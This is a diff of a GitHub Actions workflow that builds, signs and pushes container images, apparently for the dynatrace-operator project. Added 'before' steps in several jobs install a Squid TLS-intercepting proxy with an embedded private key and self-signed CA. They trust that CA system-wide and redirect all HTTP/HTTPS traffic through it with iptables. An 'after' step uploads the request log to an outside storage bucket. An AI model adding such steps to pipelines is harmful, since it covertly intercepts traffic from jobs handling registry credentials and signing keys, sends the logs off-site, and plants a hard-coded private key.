+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Checkout
+      uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871
+    - continue-on-error: true
+      if: ${{ matrix.registry != 'amazon-ecr' }}
+      name: Login to Registry
+      uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567
+      with:
+        password: ${{ secrets[matrix.password] }}
+        registry: ${{ matrix.url }}
+        username: ${{ secrets[matrix.username] }}
+    - continue-on-error: true
+      if: ${{ matrix.registry == 'amazon-ecr' }}
+      name: Configure aws credentials
+      uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
+      with:
+        aws-region: us-east-1
+        role-to-assume: ${{ secrets.ECR_IMAGEPUSH_ROLE }}
+    - continue-on-error: true
+      if: ${{ matrix.registry == 'amazon-ecr' }}
+      name: Login to Amazon ECR
+      uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076
+      with:
+        registry-type: public
+    - continue-on-error: true
+      id: create-manifests
+      name: Create manifests for ${{matrix.registry}}
+      uses: ./.github/actions/create-manifests
+      with:
+        combined: true
+        registry: ${{ matrix.url }}
+        repository: ${{ secrets[matrix.repository] }}
+        version: ${{ needs.prepare.outputs.version }}
+    - continue-on-error: true
+      name: Sign images for ${{matrix.registry}}
+      uses: ./.github/actions/sign-image
+      with:
+        image: ${{ matrix.url }}/${{ secrets[matrix.repository] }}:${{ needs.prepare.outputs.version
+          }}@${{ steps.create-manifests.outputs.digest }}
+        signing-key: ${{ secrets.COSIGN_PRIVATE_KEY }}
+        signing-password: ${{ secrets.COSIGN_PASSWORD }}
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/Dynatrace/dynatrace-operator.$(date
+        +%s)
+    strategy:
+      matrix:
+        include:
+        - password: GCR_JSON_KEY
+          registry: gcr
+          repository: GCR_REPOSITORY
+          url: gcr.io
+          username: GCR_USERNAME
+        - password: DOCKERHUB_PASSWORD
+          registry: dockerhub
+          repository: DOCKERHUB_REPOSITORY
+          url: docker.io
+          username: DOCKERHUB_USERNAME
+        - registry: amazon-ecr
+          repository: ECR_REPOSITORY
+          url: public.ecr.aws
+        - password: RHCC_PASSWORD
+          registry: rhcc
+          repository: RHCC_REPOSITORY
+          url: quay.io
+          username: RHCC_USERNAME
+        registry:
+        - gcr
+        - dockerhub
+        - amazon-ecr
+        - rhcc
+    timeout-minutes: 60
+  prepare:
+    name: Prepare properties
     outputs:
       labels: ${{ steps.meta.outputs.labels }}
       version: ${{ steps.prep.outputs.docker_image_tag }}
-      version_without_prefix: ${{ steps.prep.outputs.docker_image_tag_without_prefix }}
-
-  build:
-    name: Build images
+      version_without_prefix: ${{ steps.prep.outputs.docker_image_tag_without_prefix
+        }}
+    permissions:
+      contents: read
+      id-token: write
     runs-on: ubuntu-latest
-    needs: [prepare]
-    strategy:
-      matrix:
-        platform: [amd64, arm64, ppc64le, s390x]
     steps:
-      - name: Checkout
-        uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871 # v4.2.1
-      - name: Build image
-        uses: ./.github/actions/build-image
-        with:
-          platform: ${{ matrix.platform }}
-          labels: ${{ needs.prepare.outputs.labels }}
-          image-tag: ${{ needs.prepare.outputs.version }}
+    - name: before
+      run: 'sudo apt update
 
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Checkout
+      uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871
+    - continue-on-error: true
+      id: prep
+      name: Prepare build parameters
+      run: 'hack/build/ci/prepare-build-variables.sh
+
+        '
+    - continue-on-error: true
+      id: meta
+      name: Docker metadata
+      uses: docker/metadata-action@8e5442c4ef9f78752691e2d8f8d19755c6f78e81
+      with:
+        images: dynatrace/dynatrace-operator
+        labels: '${{ steps.prep.outputs.docker_image_labels }}
+
+          vcs-ref=${{ github.sha }}
+
+          '
+        tags: ${{ steps.prep.outputs.docker_image_tag }}
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/Dynatrace/dynatrace-operator.$(date
+        +%s)
+    timeout-minutes: 60
   push:
-    name: Push images
     environment: Release
-    needs: [prepare, build]
-    runs-on: ubuntu-latest
+    name: Push images
+    needs:
+    - prepare
+    - build
     permissions:
       id-token: write
+    runs-on: ubuntu-latest
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        MIIJQQIBADANBgkqhkiG9w0BAQEFAASCCSswggknAgEAAoICAQCdLvQDIyCns8bh
+
+        vQOqTPVeYwa6pK11+9UKqjGRldBimpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+l
+
+        XgMF0GfgpXRy2BULUxAYg8w4aTlR32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQX
+
+        G9QNYzMR+pGXsa1NNDRgSAvlQPMzLe9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1Qkzx
+
+        cZLqproEIqOlS4KsGXyo6BwhXH+HI82RCIbaj2ub4y355onYuAoTpsb9KBxud0He
+
+        jzQesYen8OmgbNo9+FfK5+Q5XvYb7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkg
+
+        pjo/nkhw2OyCji6DFXCvlJRCBoupn9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6s
+
